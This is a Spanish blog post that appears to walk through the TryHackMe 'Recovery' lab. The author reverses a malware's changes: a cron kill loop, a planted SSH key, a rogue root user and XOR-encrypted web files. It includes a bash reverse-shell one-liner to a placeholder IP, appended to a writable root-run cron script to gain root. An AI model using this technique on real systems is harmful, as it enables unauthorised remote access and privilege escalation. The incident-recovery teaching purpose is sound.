---
title: Resolución de máquina Recovery - TryHackMe
date: 2021-11-25 00:00:00 +/-TTTT
categories: [CTF, TryHackMe]
tags: [bash, ssh, strings, reversing, malware, reverse shell, scp, echo, sed, python scripting]
---

# Introducción

Bienvenidos a mi página y a este post donde veremos como solucionar la máquina Recovery de TryHackMe. Cabe aclarar que en esta máquina no estaremos vulnerando nada sino todo lo contrario, ayudaremos a Alex a solucionar y recuperar los archivos que fueron eliminados por un Malware que le hicieron instalar a través de un ataque de Spear Phishing vía e-mail, dicho mensaje se muestra  acontinuación:


> Hi Alex,
> A recent security vulnerability has been discovered that affects the web server. Could you please run this binary on the server to implement the fix?
> Regards
> - Teo

Alex nos da las credenciales de `SSH` además de brindarnos una interfaz web donde veremos las banderas por cada reparación aplicada al daño causado por el malware fixutil, podemos acceder a esta interfaz en la misma máquina a través del puerto 1337 (por que somos muy hackers).

**Username: alex  
Password: madeline**


# Resolución
Primeramente nos conectamos por `SSH` con las credenciales que Alex nos dio, y como nos contó, se imprime el texto **YOU DIDN'T SAY THE MAGIC WORD** y después de unos instantes se cierra completamente la conexión, pero si tecleamos `CTRL+C` mientras se imprime el mensaje, podemos escribir `bash` para abrir una nueva instancia de la bash y vamos a poder ejecutar ordenes.  

![SSH](/assets/img/1_THM-Recovery/1.jpg)

> Nota: alternativamente podemos escribir `sh` y de esta manera la línea de comandos no morirá, esto lo explicaremos más adelante ;)


## Flag 0

Ya que linux lee y ejecuta la ordenes dentro del archivo `.bashrc` al principio de la conexión, podemos intuir que el mensaje **YOU DIDN'T SAY THE MAGIC WORD** está dentro de dicho archivo en una orden que lo imprime en todo momento, y al abrirlo con vim podemos ver en la siguiente imagen que efectivamente fue así, **para obtener la flag 0 debemos comentar o eliminar esta línea**.

![Archivo .bashrc](/assets/img/1_THM-Recovery/2.jpg)


## Flag 1

Pero después de cierto tiempo se sigue cerrando la conexión, entonces puede tratarse de una tarea cron que se ejecuta en intervalos de tiempo. Para ver las tareas programadas hacemos un `ls -la /etc/cron.d/` lo que nos muestra una tarea de nombre `evil`, al hacer un `cat /etc/cron.d/evil` podemos ver que la tarea ejecuta lo siguiente:


![Tarea evil](/assets/img/1_THM-Recovery/3.jpg)


Cuando listamos los permisos de este script, podemos ver que tenemos permisos `rwx` (lectura, escritura y ejecución) por lo cual lo abrimos con vim y podemos ver un ciclo for que busca los PID (Process ID) de todos los procesos con nombre `bash` que se estén ejecutando y va haciendo un `kill` a cada uno de ellos, es por esto que ***debemos comentar o elimnar esta línea para que no se muera nuesta sesión `SSH` y podamos conseguir la flag 1***.


![Archivo brilliant_script.sh](/assets/img/1_THM-Recovery/4.jpg)



### Análisis de fixutil con strings


Después de realizar la modifiación, no encontramos pistas para continuar con la reparación del daño, es por esto que utilizamos la herramienta `strings` para obtener todas las cadenas imprimibles dentro del ejecutable `fixutil` y de esta manera, realizar un 'reversing' y poder analizar lo cambios realizados por este malware.  


Al revisar las cadenas obtenidas, nos encontramos con lo que parecen ser nombres de variables y funciones (index_of_encryption_key, webfile_names, XOREncryptWebFiles, encryption_key_dir, rand_string, GetWebFiles, LogIncorrectAttempt, XORFile) lo que nos hace suponer que se aplicó un "cifrado" XOR a los archivos, además, podemos notar lo que parecen ser las tareas ejecutadas por `fixutil`:

![Analisis de strings](/assets/img/1_THM-Recovery/5.jpg)

1. El archivo en la siguiente ruta `/opt/.fixutil/backup.txt` parece sospechoso y solo tiene permisos el usuario propietario (root).  
2. Se ejecutó la siguiente línea de comandos `/bin/mv /tmp/logging.so /lib/x86_64-linux-gnu/oldliblogging.so` la cual mueve el archivo `logging.so`  hacia el directorio `/lib/x86_64-linux-gnu/` con el nombre `oldliblogging.so`.  
3. Se añade una llave ssh al archivo de llaves autorizadas del usuario root
4. Se agrega el usuario `security` en el grupo de usuarios con privilegios de root además de cambiarle la contraseña a la que se puede ver en la imagen
5. La creación de `brilliant_script` y la tarea cron `evil`


![Analisis de strings](/assets/img/1_THM-Recovery/6.jpg)

6. La modificación del archivo `.bashrc` de alex
7. Esta línea de comandos se ejecutó antes de la tarea 2: `/bin/cp /lib/x86_64-linux-gnu/liblogging.so /tmp/logging.so` la cual copia el archivo `liblogging.so` hacía el directorio `/tmp/` con el nombre `logging.so` pero se deduce que se realizó alguna modificación en algún punto.
8. Se ejecuta la el módulo `liblogging.so`


Dado que las tareas identificadas se realizaron con privilegios elevados y ya que `brilliant_script` se ejecuta con privilegios de root, podemos aprovechar los permisos de escritura sobre este archivo y establecer una reverse shell con netcat agregando lo siguiente:


```shell
bash -c 'bash -i >& /dev/tcp/IP/PUERTO 0>&1'
```


> Nota: Sustituir IP por nuestra IP y PUERTO por el puerto deseado


![configuración de reverse shell](/assets/img/1_THM-Recovery/7.jpg)


## Flag 2
Una vez obtenida nuestra reverse shell con privilegios elevados, analizamos los archivos .so modificados con la herramienta head y podemos ver los iguiente para el archivo liblogging.so:


![Archivo liblogging.so](/assets/img/1_THM-Recovery/8.jpg)


Y el archivo oldliblogging.so muestra lo siguiente:

![Archivo oldlogging.so](/assets/img/1_THM-Recovery/9.jpg)




Debido a los cambios realizados por el malware ***debemos restaurar el archivo `oldliblogging.so`***, para esto ejecutamos la siguiente linea de comandos:


```shell
mv /lib/x86_64-linux-gnu/oldliblogging.so /lib/x86_64-linux-gnu/liblogging.so
``` 



## Flag 3

Como vimos durante el analisis se agregó una llave ssh al archivo `authorized_keys` del usuario root, por lo cual, ***nuestra tarea será eliminar dicha llave*** con la siguiente linea de comandos:

```shell
echo '' > /root/.ssh/authorized_keys
```



## Flag 4

***Para obtener esta bandera necesitamos eliminar el usuario security eliminandolo de los archivos `/etc/passwd` y `/etc/shadow` manualmente*** ya que en la máquina no existe la utilidad `userdel`, par eliminarlo de el primer archivo usaremos la siguiente línea de comandos:  

```shell
sed -i '$d' /etc/passwd
```

Y para eliminarlo del archivo `shadow`:


```shell
sed -i '$d' /etc/shadow
```



## Flag 5

Durante el analisis realizado con `strings` pudimos apreciar la creación del directorio oculto `/opt/.fixutil/` el cual solo tiene permisos para el usuario propietario(root) y ya que tenemos nuestra reverse shell con privilegios elevados, podemos revisar el contenido de este directorio donde nos encontramos con el archvio `backup.txt` el cual continene la contraseña con la que se cifraron los archivos:



![Directorio .fixutil](/assets/img/1_THM-Recovery/10.jpg)


Mirando en las cadenas obetnidas con `string` encontramos el directorio web `/usr/local/apache2/htdocs/` y al hacer un `cat` para revisar el contenido de los archivos, podemos ver que están cifrados:



![Archivos web](/assets/img/1_THM-Recovery/11.jpg)



Al tratarse de un cifrado XOR podemos implementar un programa en `python` para que descrifre los archivos con la llave que está en el archivo `backup.txt`, hay que recordar que la máquina no tiene `python` por lo que este proceso se hará local.

```python
from pathlib import Path

llave=b"AdsipPewFlfkmll"
archivos=["index.html","todo.html","reallyimportant.txt"]
carpeta_salida=Path("descifrados")

Path.mkdir(carpeta_salida)


for elemento in archivos:
    archivo=open(elemento,"rb")
    archivo_salida=Path("descifrados", elemento)

    salida=open(archivo_salida,"wb")
    contenido=archivo.read()
    for i in range(0,len(contenido)):
        arr=bytes(chr(contenido[i]^llave[i%len(llave)]), 'utf-8')
        salida.write(arr)
```

Una vez que hemos descifrado todos los archivos, crearemos la carpeta `descifrados` en el directorio `home` de alex y copiaremos los archivos con la herramienta `scp` de la siguiente manera:


```shell
scp descifrados/* alex@10.10.72.227:descifrados
```

A continuación, copiamos los archivos al directorio `/usr/local/apache2/htdocs/` con la shell de `root` ***y así obtendríamos la flag 5***.

```shell
cp /home/alex/descifrados/* .
```


# Conclusiones  

Con esto terminamos de revertir todos los cambios hechos por el malware y ayudamos a alex a recuperar los archivos que fueron cifrados, espero que les haya gustado y que les haya sido útil, nos vemos hasta otro post y recuerden revisar bien sus correos para no ser victimas de Phishing o Spear Phishing como nuestro amigo Alex ;)
